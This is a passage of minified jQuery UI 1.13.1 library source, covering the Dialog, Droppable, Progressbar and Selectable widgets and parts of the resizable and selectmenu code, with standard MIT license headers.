b.grid?[b.grid,b.grid]:b.grid,e=k[0]||1,f=k[1]||1,l=Math.round((n.width-g.width)/e)*e,m=Math.round((n.height-g.height)/f)*f,c=g.width+l,d=g.height+m,o=b.maxWidth&&b.maxWidth<c,p=b.maxHeight&&b.maxHeight<d,q=b.minWidth&&b.minWidth>c,r=b.minHeight&&b.minHeight>d;b.grid=k,q&&(c+=e),r&&(d+=f),o&&(c-=e),p&&(d-=f),/^(se|s|e)$/.test(j)?(a.size.width=c,a.size.height=d):/^(ne)$/.test(j)?(a.size.width=c,a.size.height=d,a.position.top=h.top-m):/^(sw)$/.test(j)?(a.size.width=c,a.size.height=d,a.position.left=h.left-l):((d-f<=0||c-e<=0)&&(i=a._getPaddingPlusBorderDimensions(this)),d-f>0?(a.size.height=d,a.position.top=h.top-m):(d=f-i.height,a.size.height=d,a.position.top=h.top+g.height-d),c-e>0?(a.size.width=c,a.position.left=h.left-l):(c=e-i.width,a.size.width=c,a.position.left=h.left+g.width-c))}}),$.ui.resizable,/*!
 * jQuery UI Dialog 1.13.1
 * http://jqueryui.com
 *
 * Copyright jQuery Foundation and other contributors
 * Released under the MIT license.
 * http://jquery.org/license
 */ $.widget("ui.dialog",{version:"1.13.1",options:{appendTo:"body",autoOpen:!0,buttons:[],classes:{"ui-dialog":"ui-corner-all","ui-dialog-titlebar":"ui-corner-all"},closeOnEscape:!0,closeText:"Close",draggable:!0,hide:null,height:"auto",maxHeight:null,maxWidth:null,minHeight:150,minWidth:150,modal:!1,position:{my:"center",at:"center",of:window,collision:"fit",using:function(a){var b=$(this).css(a).offset().top;b<0&&$(this).css("top",a.top-b)}},resizable:!0,show:null,title:null,width:300,beforeClose:null,close:null,drag:null,dragStart:null,dragStop:null,focus:null,open:null,resize:null,resizeStart:null,resizeStop:null},sizeRelatedOptions:{buttons:!0,height:!0,maxHeight:!0,maxWidth:!0,minHeight:!0,minWidth:!0,width:!0},resizableRelatedOptions:{maxHeight:!0,maxWidth:!0,minHeight:!0,minWidth:!0},_create:function(){this.originalCss={display:this.element[0].style.display,width:this.element[0].style.width,minHeight:this.element[0].style.minHeight,maxHeight:this.element[0].style.maxHeight,height:this.element[0].style.height},this.originalPosition={parent:this.element.parent(),index:this.element.parent().children().index(this.element)},this.originalTitle=this.element.attr("title"),null==this.options.title&&null!=this.originalTitle&&(this.options.title=this.originalTitle),this.options.disabled&&(this.options.disabled=!1),this._createWrapper(),this.element.show().removeAttr("title").appendTo(this.uiDialog),this._addClass("ui-dialog-content","ui-widget-content"),this._createTitlebar(),this._createButtonPane(),this.options.draggable&&$.fn.draggable&&this._makeDraggable(),this.options.resizable&&$.fn.resizable&&this._makeResizable(),this._isOpen=!1,this._trackFocus()},_init:function(){this.options.autoOpen&&this.open()},_appendTo:function(){var a=this.options.appendTo;return a&&(a.jquery||a.nodeType)?$(a):this.document.find(a||"body").eq(0)},_destroy:function(){var a,b=this.originalPosition;this._untrackInstance(),this._destroyOverlay(),this.element.removeUniqueId().css(this.originalCss).detach(),this.uiDialog.remove(),this.originalTitle&&this.element.attr("title",this.originalTitle),(a=b.parent.children().eq(b.index)).length&&a[0]!==this.element[0]?a.before(this.element):b.parent.append(this.element)},widget:function(){return this.uiDialog},disable:$.noop,enable:$.noop,close:function(a){var b=this;this._isOpen&& !1!==this._trigger("beforeClose",a)&&(this._isOpen=!1,this._focusedElement=null,this._destroyOverlay(),this._untrackInstance(),this.opener.filter(":focusable").trigger("focus").length||$.ui.safeBlur($.ui.safeActiveElement(this.document[0])),this._hide(this.uiDialog,this.options.hide,function(){b._trigger("close",a)}))},isOpen:function(){return this._isOpen},moveToTop:function(){this._moveToTop()},_moveToTop:function(c,d){var a=!1,e=this.uiDialog.siblings(".ui-front:visible").map(function(){return+$(this).css("z-index")}).get(),b=Math.max.apply(null,e);return b>= +this.uiDialog.css("z-index")&&(this.uiDialog.css("z-index",b+1),a=!0),a&&!d&&this._trigger("focus",c),a},open:function(){var a=this;if(this._isOpen){this._moveToTop()&&this._focusTabbable();return}this._isOpen=!0,this.opener=$($.ui.safeActiveElement(this.document[0])),this._size(),this._position(),this._createOverlay(),this._moveToTop(null,!0),this.overlay&&this.overlay.css("z-index",this.uiDialog.css("z-index")-1),this._show(this.uiDialog,this.options.show,function(){a._focusTabbable(),a._trigger("focus")}),this._makeFocusTarget(),this._trigger("open")},_focusTabbable:function(){var a=this._focusedElement;a||(a=this.element.find("[autofocus]")),a.length||(a=this.element.find(":tabbable")),a.length||(a=this.uiDialogButtonPane.find(":tabbable")),a.length||(a=this.uiDialogTitlebarClose.filter(":tabbable")),a.length||(a=this.uiDialog),a.eq(0).trigger("focus")},_restoreTabbableFocus:function(){var a=$.ui.safeActiveElement(this.document[0]);this.uiDialog[0]===a||$.contains(this.uiDialog[0],a)||this._focusTabbable()},_keepFocus:function(a){a.preventDefault(),this._restoreTabbableFocus(),this._delay(this._restoreTabbableFocus)},_createWrapper:function(){this.uiDialog=$("<div>").hide().attr({tabIndex:-1,role:"dialog"}).appendTo(this._appendTo()),this._addClass(this.uiDialog,"ui-dialog","ui-widget ui-widget-content ui-front"),this._on(this.uiDialog,{keydown:function(a){if(this.options.closeOnEscape&&!a.isDefaultPrevented()&&a.keyCode&&a.keyCode===$.ui.keyCode.ESCAPE){a.preventDefault(),this.close(a);return}if(!(a.keyCode!==$.ui.keyCode.TAB||a.isDefaultPrevented())){var b=this.uiDialog.find(":tabbable"),c=b.first(),d=b.last();a.target!==d[0]&&a.target!==this.uiDialog[0]||a.shiftKey?(a.target===c[0]||a.target===this.uiDialog[0])&&a.shiftKey&&(this._delay(function(){d.trigger("focus")}),a.preventDefault()):(this._delay(function(){c.trigger("focus")}),a.preventDefault())}},mousedown:function(a){this._moveToTop(a)&&this._focusTabbable()}}),this.element.find("[aria-describedby]").length||this.uiDialog.attr({"aria-describedby":this.element.uniqueId().attr("id")})},_createTitlebar:function(){var a;this.uiDialogTitlebar=$("<div>"),this._addClass(this.uiDialogTitlebar,"ui-dialog-titlebar","ui-widget-header ui-helper-clearfix"),this._on(this.uiDialogTitlebar,{mousedown:function(a){$(a.target).closest(".ui-dialog-titlebar-close")||this.uiDialog.trigger("focus")}}),this.uiDialogTitlebarClose=$("<button type='button'></button>").button({label:$("<a>").text(this.options.closeText).html(),icon:"ui-icon-closethick",showLabel:!1}).appendTo(this.uiDialogTitlebar),this._addClass(this.uiDialogTitlebarClose,"ui-dialog-titlebar-close"),this._on(this.uiDialogTitlebarClose,{click:function(a){a.preventDefault(),this.close(a)}}),a=$("<span>").uniqueId().prependTo(this.uiDialogTitlebar),this._addClass(a,"ui-dialog-title"),this._title(a),this.uiDialogTitlebar.prependTo(this.uiDialog),this.uiDialog.attr({"aria-labelledby":a.attr("id")})},_title:function(a){this.options.title?a.text(this.options.title):a.html("&#160;")},_createButtonPane:function(){this.uiDialogButtonPane=$("<div>"),this._addClass(this.uiDialogButtonPane,"ui-dialog-buttonpane","ui-widget-content ui-helper-clearfix"),this.uiButtonSet=$("<div>").appendTo(this.uiDialogButtonPane),this._addClass(this.uiButtonSet,"ui-dialog-buttonset"),this._createButtons()},_createButtons:function(){var b=this,a=this.options.buttons;if(this.uiDialogButtonPane.remove(),this.uiButtonSet.empty(),$.isEmptyObject(a)||Array.isArray(a)&&!a.length){this._removeClass(this.uiDialog,"ui-dialog-buttons");return}$.each(a,function(d,a){var e,c;a="function"==typeof a?{click:a,text:d}:a,e=(a=$.extend({type:"button"},a)).click,c={icon:a.icon,iconPosition:a.iconPosition,showLabel:a.showLabel,icons:a.icons,text:a.text},delete a.click,delete a.icon,delete a.iconPosition,delete a.showLabel,delete a.icons,"boolean"==typeof a.text&&delete a.text,$("<button></button>",a).button(c).appendTo(b.uiButtonSet).on("click",function(){e.apply(b.element[0],arguments)})}),this._addClass(this.uiDialog,"ui-dialog-buttons"),this.uiDialogButtonPane.appendTo(this.uiDialog)},_makeDraggable:function(){var a=this,b=this.options;function c(a){return{position:a.position,offset:a.offset}}this.uiDialog.draggable({cancel:".ui-dialog-content, .ui-dialog-titlebar-close",handle:".ui-dialog-titlebar",containment:"document",start:function(b,d){a._addClass($(this),"ui-dialog-dragging"),a._blockFrames(),a._trigger("dragStart",b,c(d))},drag:function(b,d){a._trigger("drag",b,c(d))},stop:function(g,d){var e=d.offset.left-a.document.scrollLeft(),f=d.offset.top-a.document.scrollTop();b.position={my:"left top",at:"left"+(e>=0?"+":"")+e+" top"+(f>=0?"+":"")+f,of:a.window},a._removeClass($(this),"ui-dialog-dragging"),a._unblockFrames(),a._trigger("dragStop",g,c(d))}})},_makeResizable:function(){var d=this,a=this.options,b=a.resizable,c=this.uiDialog.css("position");function e(a){return{originalPosition:a.originalPosition,originalSize:a.originalSize,position:a.position,size:a.size}}this.uiDialog.resizable({cancel:".ui-dialog-content",containment:"document",alsoResize:this.element,maxWidth:a.maxWidth,maxHeight:a.maxHeight,minWidth:a.minWidth,minHeight:this._minHeight(),handles:"string"==typeof b?b:"n,e,s,w,se,sw,ne,nw",start:function(a,b){d._addClass($(this),"ui-dialog-resizing"),d._blockFrames(),d._trigger("resizeStart",a,e(b))},resize:function(a,b){d._trigger("resize",a,e(b))},stop:function(g,h){var b=d.uiDialog.offset(),c=b.left-d.document.scrollLeft(),f=b.top-d.document.scrollTop();a.height=d.uiDialog.height(),a.width=d.uiDialog.width(),a.position={my:"left top",at:"left"+(c>=0?"+":"")+c+" top"+(f>=0?"+":"")+f,of:d.window},d._removeClass($(this),"ui-dialog-resizing"),d._unblockFrames(),d._trigger("resizeStop",g,e(h))}}).css("position",c)},_trackFocus:function(){this._on(this.widget(),{focusin:function(a){this._makeFocusTarget(),this._focusedElement=$(a.target)}})},_makeFocusTarget:function(){this._untrackInstance(),this._trackingInstances().unshift(this)},_untrackInstance:function(){var a=this._trackingInstances(),b=$.inArray(this,a);-1!==b&&a.splice(b,1)},_trackingInstances:function(){var a=this.document.data("ui-dialog-instances");return a||(a=[],this.document.data("ui-dialog-instances",a)),a},_minHeight:function(){var a=this.options;return"auto"===a.height?a.minHeight:Math.min(a.minHeight,a.height)},_position:function(){var a=this.uiDialog.is(":visible");a||this.uiDialog.show(),this.uiDialog.position(this.options.position),a||this.uiDialog.hide()},_setOptions:function(a){var d=this,b=!1,c={};$.each(a,function(a,e){d._setOption(a,e),a in d.sizeRelatedOptions&&(b=!0),a in d.resizableRelatedOptions&&(c[a]=e)}),b&&(this._size(),this._position()),this.uiDialog.is(":data(ui-resizable)")&&this.uiDialog.resizable("option",c)},_setOption:function(a,b){var e,d,c=this.uiDialog;"disabled"!==a&&(this._super(a,b),"appendTo"===a&&this.uiDialog.appendTo(this._appendTo()),"buttons"===a&&this._createButtons(),"closeText"===a&&this.uiDialogTitlebarClose.button({label:$("<a>").text(""+this.options.closeText).html()}),"draggable"===a&&((e=c.is(":data(ui-draggable)"))&&!b&&c.draggable("destroy"),!e&&b&&this._makeDraggable()),"position"===a&&this._position(),"resizable"!==a||((d=c.is(":data(ui-resizable)"))&&!b&&c.resizable("destroy"),d&&"string"==typeof b&&c.resizable("option","handles",b),d|| !1===b||this._makeResizable()),"title"===a&&this._title(this.uiDialogTitlebar.find(".ui-dialog-title")))},_size:function(){var b,c,d,a=this.options;this.element.show().css({width:"auto",minHeight:0,maxHeight:"none",height:0}),a.minWidth>a.width&&(a.width=a.minWidth),b=this.uiDialog.css({height:"auto",width:a.width}).outerHeight(),c=Math.max(0,a.minHeight-b),d="number"==typeof a.maxHeight?Math.max(0,a.maxHeight-b):"none","auto"===a.height?this.element.css({minHeight:c,maxHeight:d,height:"auto"}):this.element.height(Math.max(0,a.height-b)),this.uiDialog.is(":data(ui-resizable)")&&this.uiDialog.resizable("option","minHeight",this._minHeight())},_blockFrames:function(){this.iframeBlocks=this.document.find("iframe").map(function(){var a=$(this);return $("<div>").css({position:"absolute",width:a.outerWidth(),height:a.outerHeight()}).appendTo(a.parent()).offset(a.offset())[0]})},_unblockFrames:function(){this.iframeBlocks&&(this.iframeBlocks.remove(),delete this.iframeBlocks)},_allowInteraction:function(a){return!!$(a.target).closest(".ui-dialog").length||!!$(a.target).closest(".ui-datepicker").length},_createOverlay:function(){if(this.options.modal){var a=$.fn.jquery.substring(0,4),b=!0;this._delay(function(){b=!1}),this.document.data("ui-dialog-overlays")||this.document.on("focusin.ui-dialog",(function(d){if(!b){var c=this._trackingInstances()[0];c._allowInteraction(d)||(d.preventDefault(),c._focusTabbable(),("3.4."===a||"3.5."===a)&&c._delay(c._restoreTabbableFocus))}}).bind(this)),this.overlay=$("<div>").appendTo(this._appendTo()),this._addClass(this.overlay,null,"ui-widget-overlay ui-front"),this._on(this.overlay,{mousedown:"_keepFocus"}),this.document.data("ui-dialog-overlays",(this.document.data("ui-dialog-overlays")||0)+1)}},_destroyOverlay:function(){if(this.options.modal&&this.overlay){var a=this.document.data("ui-dialog-overlays")-1;a?this.document.data("ui-dialog-overlays",a):(this.document.off("focusin.ui-dialog"),this.document.removeData("ui-dialog-overlays")),this.overlay.remove(),this.overlay=null}}}),!1!==$.uiBackCompat&&$.widget("ui.dialog",$.ui.dialog,{options:{dialogClass:""},_createWrapper:function(){this._super(),this.uiDialog.addClass(this.options.dialogClass)},_setOption:function(a,b){"dialogClass"===a&&this.uiDialog.removeClass(this.options.dialogClass).addClass(b),this._superApply(arguments)}}),$.ui.dialog,/*!
 * jQuery UI Droppable 1.13.1
 * http://jqueryui.com
 *
 * Copyright jQuery Foundation and other contributors
 * Released under the MIT license.
 * http://jquery.org/license
 */ $.widget("ui.droppable",{version:"1.13.1",widgetEventPrefix:"drop",options:{accept:"*",addClasses:!0,greedy:!1,scope:"default",tolerance:"intersect",activate:null,deactivate:null,drop:null,out:null,over:null},_create:function(){var c,a=this.options,b=a.accept;this.isover=!1,this.isout=!0,this.accept="function"==typeof b?b:function(a){return a.is(b)},this.proportions=function(){if(!arguments.length)return c||(c={width:this.element[0].offsetWidth,height:this.element[0].offsetHeight});c=arguments[0]},this._addToManager(a.scope),a.addClasses&&this._addClass("ui-droppable")},_addToManager:function(a){$.ui.ddmanager.droppables[a]=$.ui.ddmanager.droppables[a]||[],$.ui.ddmanager.droppables[a].push(this)},_splice:function(b){for(var a=0;a<b.length;a++)b[a]===this&&b.splice(a,1)},_destroy:function(){var a=$.ui.ddmanager.droppables[this.options.scope];this._splice(a)},_setOption:function(b,a){if("accept"===b)this.accept="function"==typeof a?a:function(b){return b.is(a)};else if("scope"===b){var c=$.ui.ddmanager.droppables[this.options.scope];this._splice(c),this._addToManager(a)}this._super(b,a)},_activate:function(b){var a=$.ui.ddmanager.current;this._addActiveClass(),a&&this._trigger("activate",b,this.ui(a))},_deactivate:function(b){var a=$.ui.ddmanager.current;this._removeActiveClass(),a&&this._trigger("deactivate",b,this.ui(a))},_over:function(b){var a=$.ui.ddmanager.current;a&&(a.currentItem||a.element)[0]!==this.element[0]&&this.accept.call(this.element[0],a.currentItem||a.element)&&(this._addHoverClass(),this._trigger("over",b,this.ui(a)))},_out:function(b){var a=$.ui.ddmanager.current;a&&(a.currentItem||a.element)[0]!==this.element[0]&&this.accept.call(this.element[0],a.currentItem||a.element)&&(this._removeHoverClass(),this._trigger("out",b,this.ui(a)))},_drop:function(b,c){var a=c||$.ui.ddmanager.current,d=!1;return!!a&&(a.currentItem||a.element)[0]!==this.element[0]&&(this.element.find(":data(ui-droppable)").not(".ui-draggable-dragging").each(function(){var c=$(this).droppable("instance");if(c.options.greedy&&!c.options.disabled&&c.options.scope===a.options.scope&&c.accept.call(c.element[0],a.currentItem||a.element)&&$.ui.intersect(a,$.extend(c,{offset:c.element.offset()}),c.options.tolerance,b))return d=!0,!1}),!d&& !!this.accept.call(this.element[0],a.currentItem||a.element)&&(this._removeActiveClass(),this._removeHoverClass(),this._trigger("drop",b,this.ui(a)),this.element))},ui:function(a){return{draggable:a.currentItem||a.element,helper:a.helper,position:a.position,offset:a.positionAbs}},_addHoverClass:function(){this._addClass("ui-droppable-hover")},_removeHoverClass:function(){this._removeClass("ui-droppable-hover")},_addActiveClass:function(){this._addClass("ui-droppable-active")},_removeActiveClass:function(){this._removeClass("ui-droppable-active")}}),$.ui.intersect=function(){function a(a,b,c){return a>=b&&a<b+c}return function(b,c,m,l){if(!c.offset)return!1;var f=(b.positionAbs||b.position.absolute).left+b.margins.left,g=(b.positionAbs||b.position.absolute).top+b.margins.top,h=f+b.helperProportions.width,i=g+b.helperProportions.height,d=c.offset.left,e=c.offset.top,j=d+c.proportions().width,k=e+c.proportions().height;switch(m){case"fit":return d<=f&&h<=j&&e<=g&&i<=k;case"intersect":return d<f+b.helperProportions.width/2&&h-b.helperProportions.width/2<j&&e<g+b.helperProportions.height/2&&i-b.helperProportions.height/2<k;case"pointer":return a(l.pageY,e,c.proportions().height)&&a(l.pageX,d,c.proportions().width);case"touch":return(g>=e&&g<=k||i>=e&&i<=k||g<e&&i>k)&&(f>=d&&f<=j||h>=d&&h<=j||f<d&&h>j);default:return!1}}}(),$.ui.ddmanager={current:null,droppables:{default:[]},prepareOffsets:function(c,e){var a,d,b=$.ui.ddmanager.droppables[c.options.scope]||[],g=e?e.type:null,f=(c.currentItem||c.element).find(":data(ui-droppable)").addBack();droppablesLoop:for(a=0;a<b.length;a++)if(!b[a].options.disabled&&(!c||b[a].accept.call(b[a].element[0],c.currentItem||c.element))){for(d=0;d<f.length;d++)if(f[d]===b[a].element[0]){b[a].proportions().height=0;continue droppablesLoop}b[a].visible="none"!==b[a].element.css("display"),b[a].visible&&("mousedown"===g&&b[a]._activate.call(b[a],e),b[a].offset=b[a].element.offset(),b[a].proportions({width:b[a].element[0].offsetWidth,height:b[a].element[0].offsetHeight}))}},drop:function(a,c){var b=!1;return $.each(($.ui.ddmanager.droppables[a.options.scope]||[]).slice(),function(){this.options&&(!this.options.disabled&&this.visible&&$.ui.intersect(a,this,this.options.tolerance,c)&&(b=this._drop.call(this,c)||b),!this.options.disabled&&this.visible&&this.accept.call(this.element[0],a.currentItem||a.element)&&(this.isout=!0,this.isover=!1,this._deactivate.call(this,c)))}),b},dragStart:function(a,b){a.element.parentsUntil("body").on("scroll.droppable",function(){a.options.refreshPositions||$.ui.ddmanager.prepareOffsets(a,b)})},drag:function(a,b){a.options.refreshPositions&&$.ui.ddmanager.prepareOffsets(a,b),$.each($.ui.ddmanager.droppables[a.options.scope]||[],function(){if(!this.options.disabled&&!this.greedyChild&&this.visible){var c,g,e,f=$.ui.intersect(a,this,this.options.tolerance,b),d=!f&&this.isover?"isout":f&&!this.isover?"isover":null;d&&(this.options.greedy&&(g=this.options.scope,(e=this.element.parents(":data(ui-droppable)").filter(function(){return $(this).droppable("instance").options.scope===g})).length&&((c=$(e[0]).droppable("instance")).greedyChild="isover"===d)),c&&"isover"===d&&(c.isover=!1,c.isout=!0,c._out.call(c,b)),this[d]=!0,this["isout"===d?"isover":"isout"]=!1,this["isover"===d?"_over":"_out"].call(this,b),c&&"isout"===d&&(c.isout=!1,c.isover=!0,c._over.call(c,b)))}})},dragStop:function(a,b){a.element.parentsUntil("body").off("scroll.droppable"),a.options.refreshPositions||$.ui.ddmanager.prepareOffsets(a,b)}},!1!==$.uiBackCompat&&$.widget("ui.droppable",$.ui.droppable,{options:{hoverClass:!1,activeClass:!1},_addActiveClass:function(){this._super(),this.options.activeClass&&this.element.addClass(this.options.activeClass)},_removeActiveClass:function(){this._super(),this.options.activeClass&&this.element.removeClass(this.options.activeClass)},_addHoverClass:function(){this._super(),this.options.hoverClass&&this.element.addClass(this.options.hoverClass)},_removeHoverClass:function(){this._super(),this.options.hoverClass&&this.element.removeClass(this.options.hoverClass)}}),$.ui.droppable,$.widget("ui.progressbar",{version:"1.13.1",options:{classes:{"ui-progressbar":"ui-corner-all","ui-progressbar-value":"ui-corner-left","ui-progressbar-complete":"ui-corner-right"},max:100,value:0,change:null,complete:null},min:0,_create:function(){this.oldValue=this.options.value=this._constrainedValue(),this.element.attr({role:"progressbar","aria-valuemin":this.min}),this._addClass("ui-progressbar","ui-widget ui-widget-content"),this.valueDiv=$("<div>").appendTo(this.element),this._addClass(this.valueDiv,"ui-progressbar-value","ui-widget-header"),this._refreshValue()},_destroy:function(){this.element.removeAttr("role aria-valuemin aria-valuemax aria-valuenow"),this.valueDiv.remove()},value:function(a){if(void 0===a)return this.options.value;this.options.value=this._constrainedValue(a),this._refreshValue()},_constrainedValue:function(a){return void 0===a&&(a=this.options.value),this.indeterminate=!1===a,"number"!=typeof a&&(a=0),!this.indeterminate&&Math.min(this.options.max,Math.max(this.min,a))},_setOptions:function(a){var b=a.value;delete a.value,this._super(a),this.options.value=this._constrainedValue(b),this._refreshValue()},_setOption:function(b,a){"max"===b&&(a=Math.max(this.min,a)),this._super(b,a)},_setOptionDisabled:function(a){this._super(a),this.element.attr("aria-disabled",a),this._toggleClass(null,"ui-state-disabled",!!a)},_percentage:function(){return this.indeterminate?100:100*(this.options.value-this.min)/(this.options.max-this.min)},_refreshValue:function(){var a=this.options.value,b=this._percentage();this.valueDiv.toggle(this.indeterminate||a>this.min).width(b.toFixed(0)+"%"),this._toggleClass(this.valueDiv,"ui-progressbar-complete",null,a===this.options.max)._toggleClass("ui-progressbar-indeterminate",null,this.indeterminate),this.indeterminate?(this.element.removeAttr("aria-valuenow"),this.overlayDiv||(this.overlayDiv=$("<div>").appendTo(this.valueDiv),this._addClass(this.overlayDiv,"ui-progressbar-overlay"))):(this.element.attr({"aria-valuemax":this.options.max,"aria-valuenow":a}),this.overlayDiv&&(this.overlayDiv.remove(),this.overlayDiv=null)),this.oldValue!==a&&(this.oldValue=a,this._trigger("change")),a===this.options.max&&this._trigger("complete")}}),$.widget("ui.selectable",$.ui.mouse,{version:"1.13.1",options:{appendTo:"body",autoRefresh:!0,distance:0,filter:"*",tolerance:"touch",selected:null,selecting:null,start:null,stop:null,unselected:null,unselecting:null},_create:function(){var a=this;this._addClass("ui-selectable"),this.dragged=!1,this.refresh=function(){a.elementPos=$(a.element[0]).offset(),a.selectees=$(a.options.filter,a.element[0]),a._addClass(a.selectees,"ui-selectee"),a.selectees.each(function(){var b=$(this),d=b.offset(),c={left:d.left-a.elementPos.left,top:d.top-a.elementPos.top};$.data(this,"selectable-item",{element:this,$element:b,left:c.left,top:c.top,right:c.left+b.outerWidth(),bottom:c.top+b.outerHeight(),startselected:!1,selected:b.hasClass("ui-selected"),selecting:b.hasClass("ui-selecting"),unselecting:b.hasClass("ui-unselecting")})})},this.refresh(),this._mouseInit(),this.helper=$("<div>"),this._addClass(this.helper,"ui-selectable-helper")},_destroy:function(){this.selectees.removeData("selectable-item"),this._mouseDestroy()},_mouseStart:function(a){var c=this,b=this.options;this.opos=[a.pageX,a.pageY],this.elementPos=$(this.element[0]).offset(),this.options.disabled||(this.selectees=$(b.filter,this.element[0]),this._trigger("start",a),$(b.appendTo).append(this.helper),this.helper.css({left:a.pageX,top:a.pageY,width:0,height:0}),b.autoRefresh&&this.refresh(),this.selectees.filter(".ui-selected").each(function(){var b=$.data(this,"selectable-item");b.startselected=!0,a.metaKey||a.ctrlKey||(c._removeClass(b.$element,"ui-selected"),b.selected=!1,c._addClass(b.$element,"ui-unselecting"),b.unselecting=!0,c._trigger("unselecting",a,{unselecting:b.element}))}),$(a.target).parents().addBack().each(function(){var d,b=$.data(this,"selectable-item");if(b)return d=!a.metaKey&&!a.ctrlKey||!b.$element.hasClass("ui-selected"),c._removeClass(b.$element,d?"ui-unselecting":"ui-selected")._addClass(b.$element,d?"ui-selecting":"ui-unselecting"),b.unselecting=!d,b.selecting=d,b.selected=d,d?c._trigger("selecting",a,{selecting:b.element}):c._trigger("unselecting",a,{unselecting:b.element}),!1}))},_mouseDrag:function(f){if(this.dragged=!0,!this.options.disabled){var c,g=this,h=this.options,a=this.opos[0],b=this.opos[1],d=f.pageX,e=f.pageY;return a>d&&(c=d,d=a,a=c),b>e&&(c=e,e=b,b=c),this.helper.css({left:a,top:b,width:d-a,height:e-b}),this.selectees.each(function(){var c=$.data(this,"selectable-item"),j=!1,i={};c&&c.element!==g.element[0]&&(i.left=c.left+g.elementPos.left,i.right=c.right+g.elementPos.left,i.top=c.top+g.elementPos.top,i.bottom=c.bottom+g.elementPos.top,"touch"===h.tolerance?j=!(i.left>d||i.right<a||i.top>e||i.bottom<b):"fit"===h.tolerance&&(j=i.left>a&&i.right<d&&i.top>b&&i.bottom<e),j?(c.selected&&(g._removeClass(c.$element,"ui-selected"),c.selected=!1),c.unselecting&&(g._removeClass(c.$element,"ui-unselecting"),c.unselecting=!1),c.selecting||(g._addClass(c.$element,"ui-selecting"),c.selecting=!0,g._trigger("selecting",f,{selecting:c.element}))):(c.selecting&&((f.metaKey||f.ctrlKey)&&c.startselected?(g._removeClass(c.$element,"ui-selecting"),c.selecting=!1,g._addClass(c.$element,"ui-selected"),c.selected=!0):(g._removeClass(c.$element,"ui-selecting"),c.selecting=!1,c.startselected&&(g._addClass(c.$element,"ui-unselecting"),c.unselecting=!0),g._trigger("unselecting",f,{unselecting:c.element}))),!c.selected||f.metaKey||f.ctrlKey||c.startselected||(g._removeClass(c.$element,"ui-selected"),c.selected=!1,g._addClass(c.$element,"ui-unselecting"),c.unselecting=!0,g._trigger("unselecting",f,{unselecting:c.element}))))}),!1}},_mouseStop:function(a){var b=this;return this.dragged=!1,$(".ui-unselecting",this.element[0]).each(function(){var c=$.data(this,"selectable-item");b._removeClass(c.$element,"ui-unselecting"),c.unselecting=!1,c.startselected=!1,b._trigger("unselected",a,{unselected:c.element})}),$(".ui-selecting",this.element[0]).each(function(){var c=$.data(this,"selectable-item");b._removeClass(c.$element,"ui-selecting")._addClass(c.$element,"ui-selected"),c.selecting=!1,c.selected=!0,c.startselected=!0,b._trigger("selected",a,{selected:c.element})}),this._trigger("stop",a),this.helper.remove(),!1}}),$.widget("ui.selectmenu",[$.ui.formResetMixin,{version:"1.13.1",defaultElement:"<select>",options:{appendTo:null,classes:{"ui-selectmenu-button-open":"ui-corner-top","ui-selectmenu-button-closed":"ui-corner-all"},disabled:null,icons:{button:"ui-icon-triangle-1-s"},position:{my:"left top",at:"left bottom",collision:"none"},width:!1,change:null,close:null,focus:null,open:null,select:null},_create:function(){var a=this.element.uniqueId().attr("id");this.ids={element:a,button:a+"-button",menu:a+"-menu"},this._drawButton(),this._drawMenu(),this._bindFormResetHandler(),this._rendered=!1,this.menuItems=$()},_drawButton:function(){var a,c=this,b=this._parseOption(this.element.find("option:selected"),this.element[0].selectedIndex);this.labels=this.element.labels().attr("for",this.ids.button),this._on(this.labels,{click:function(a){this.button.trigger("focus"),a.preventDefault()}}),this.element.hide(),this.button=$("<span>",{tabindex:this.options.disabled?-1:0,id:this.ids.button,role:"combobox","aria-expanded":"false","aria-autocomplete":"list","aria-owns":this.ids.menu,"aria-haspopup":"true",title:this.element.attr("title")}).insertAfter(this.element),this._addClass(this.button,"ui-selectmenu-button ui-selectmenu-button-closed","ui-button ui-widget"),a=$("<span>").appendTo(this.button),this._addClass(a,"ui-selectmenu-icon","ui-icon "+this.options.icons.button),this.buttonItem=this._renderButtonItem(b).appendTo(this.button),!1!==this.options.width&&this._resizeButton(),this._on(this.button,this._buttonEvents),this.button.one("focusin",function(){c._rendered||c._refreshMenu()})},_drawMenu:function(){var a=this;this.menu=$("<ul>",{"aria-hidden":"true","aria-labelledby":this.ids.button,id:this.ids.menu}),this.menuWrap=$("<div>").append(this.menu),this._addClass(this.menuWrap,"ui-selectmenu-menu","ui-front"),this.menuWrap.appendTo(this._appendTo()),this.menuInstance=this.menu.menu({classes:{"ui-menu":"ui-corner-bottom"},role:"listbox",select:function(b,c){b.preventDefault(),a._setSelection(),a._select(c.item.data("ui-selectmenu-item"),b)},focus:function(c,d){var b=d.item.data("ui-selectmenu-item");null==a.focusIndex||b.index===a.focusIndex||(a._trigger("focus",c,{item:b}),a.isOpen||a._select(b,c)),a.focusIndex=b.index,a.button.attr("aria-activedescendant",a.menuItems.eq(b.index).attr("id"))}}).menu("instance"),this.menuInstance._off(this.menu,"mouseleave"),this.menuInstance._closeOnDocumentClick=function(){return!1},this.menuInstance._isDivider=function(){return!1}},refresh:function(){this._refreshMenu(),this.buttonItem.replaceWith(this.buttonItem=this._renderButtonItem(this._getSelectedItem().data("ui-selectmenu-item")||{})),null===this.options.width&&this._resizeButton()},_refreshMenu:function(){var a,b=this.element.find("option");this.menu.empty(),this._parseOptions(b),this._renderMenu(this.menu,this.items),this.menuInstance.refresh(),this.menuItems=this.menu.find("li").not(".ui-selectmenu-optgroup").find(".ui-menu-item-wrapper"),this._rendered=!0,b.length&&(a=this._getSelectedItem(),this.menuInstance.focus(null,a),this._setAria(a.data("ui-selectmenu-item")),this._setOption("disabled",this.element.prop("disabled")))},open:function(a){!this.options.disabled&&(this._rendered?(this._removeClass(this.menu.find(".ui-state-active"),null,"ui-state-active"),this.menuInstance.focus(null,this._getSelectedItem())):this._refreshMenu(),this.menuItems.length&&(this.isOpen=!0,this._toggleAttr(),this._resizeMenu(),this._position(),this._on(this.document,this._documentClick),this._trigger("open",a)))},_position:function(){this.menuWrap.position($.extend({of:this.button},this.options.position))},close:function(a){this.isOpen&&(this.isOpen=!1,this._toggleAttr(),this.range=null,this._off(this.document),this._trigger("close",a))},widget:function(){return this.button},menuWidget:function(){return this.menu},_renderButtonItem:function(b){var a=$("<span>");return this._setText(a,b.label),this._addClass(a,"ui-selectmenu-text"),a},_renderMenu:function(b,a){var c=this,d="";$.each(a,function(f,a){var e;a.optgroup!==d&&(e=$("<li>",{text:a.optgroup}),c._addClass(e,"ui-selectmenu-optgroup","ui-menu-divider"+(a.element.parent("optgroup").prop("disabled")?" 